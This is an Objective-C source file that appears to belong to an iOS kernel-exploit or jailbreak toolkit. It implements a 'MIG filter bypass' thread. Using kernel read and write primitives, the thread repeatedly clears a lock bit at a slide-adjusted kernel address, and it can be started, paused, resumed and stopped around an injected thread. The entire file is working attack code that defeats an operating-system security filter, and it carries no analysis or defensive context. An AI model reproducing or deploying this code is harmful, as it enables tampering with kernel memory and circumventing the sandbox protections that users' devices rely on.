#import <Foundation/Foundation.h>
#import <pthread.h>
#import <mach/mach.h>

#import "MigFilterBypassThread.h"
#import "../kexploit/kcompat.h"
#import "../kexploit/rc_offsets.h"

// run-flag states
#define RUN_FLAG_STOP    0
#define RUN_FLAG_RUN     1
#define RUN_FLAG_PAUSE   2

static bool     g_MFB_initialized = false;
static pthread_t g_MFB_thread     = NULL;
static volatile int g_MFB_runFlag = RUN_FLAG_STOP;

static uint64_t g_MFB_migLock    = 0;
static uint64_t g_MFB_migSbxMsg  = 0;
static uint64_t g_MFB_migStackLR = 0;

// Threads to monitor (self-thread and the thread we're injecting)
static uint64_t g_MFB_monitorThread1 = 0;
static uint64_t g_MFB_monitorThread2 = 0;

// ── thread body ──────────────────────────────────────────────────────────────

static void *mfb_thread_body(void *arg)
{
    (void)arg;
    while (g_MFB_runFlag != RUN_FLAG_STOP) {
        while (g_MFB_runFlag == RUN_FLAG_PAUSE)
            usleep(500);
        if (g_MFB_runFlag == RUN_FLAG_STOP)
            break;

        // Release migLock if held
        if (g_MFB_migLock) {
            uint64_t lock = ds_kread64(g_MFB_migLock);
            if (lock & 1ULL) {
                ds_kwrite64(g_MFB_migLock, lock & ~1ULL);
            }
        }
        usleep(100);
    }
    return NULL;
}

// ── public API ───────────────────────────────────────────────────────────────

int mig_bypass_init(uint64_t kernelSlide, uint64_t migLockOff,
                    uint64_t migSbxMsgOff, uint64_t migKernelStackLROff)
{
    g_MFB_migLock    = (kernelSlide && migLockOff)    ? migLockOff    + kernelSlide : 0;
    g_MFB_migSbxMsg  = (kernelSlide && migSbxMsgOff)  ? migSbxMsgOff  + kernelSlide : 0;
    g_MFB_migStackLR = (kernelSlide && migKernelStackLROff) ? migKernelStackLROff + kernelSlide : 0;

    if (!g_MFB_migLock) {
        printf("[%s:%d] mig_bypass_init: no offsets provided, bypass disabled\n",
               __FUNCTION__, __LINE__);
        g_MFB_initialized = false;
        return -1;
    }

    printf("[%s:%d] Initialized: kernelSlide=0x%llx, migLock=0x%llx, migSbxMsg=0x%llx, migLR=0x%llx\n",
           __FUNCTION__, __LINE__,
           (unsigned long long)kernelSlide,
           (unsigned long long)migLockOff,
           (unsigned long long)migSbxMsgOff,
           (unsigned long long)migKernelStackLROff);

    g_MFB_initialized = true;
    return 0;
}

void mig_bypass_start(void)
{
    if (!g_MFB_initialized) {
        printf("[%s:%d] Not initialized\n", __FUNCTION__, __LINE__);
        return;
    }
    if (g_MFB_thread) {
        printf("[%s:%d] Thread already running\n", __FUNCTION__, __LINE__);
        return;
    }

    g_MFB_runFlag = RUN_FLAG_PAUSE;
    pthread_attr_t pattr;
    pthread_attr_init(&pattr);
    pthread_create(&g_MFB_thread, &pattr, mfb_thread_body, NULL);
    pthread_attr_destroy(&pattr);
}

void mig_bypass_resume(void)
{
    if (g_MFB_initialized)
        g_MFB_runFlag = RUN_FLAG_RUN;
}

void mig_bypass_pause(void)
{
    if (g_MFB_initialized)
        g_MFB_runFlag = RUN_FLAG_PAUSE;
}

void mig_bypass_monitor_threads(uint64_t thread1, uint64_t thread2)
{
    g_MFB_monitorThread1 = thread1;
    g_MFB_monitorThread2 = thread2;
}

void mig_bypass_stop(void)
{
    g_MFB_runFlag = RUN_FLAG_STOP;
    if (g_MFB_thread) {
        pthread_join(g_MFB_thread, NULL);
        g_MFB_thread = NULL;
    }
}
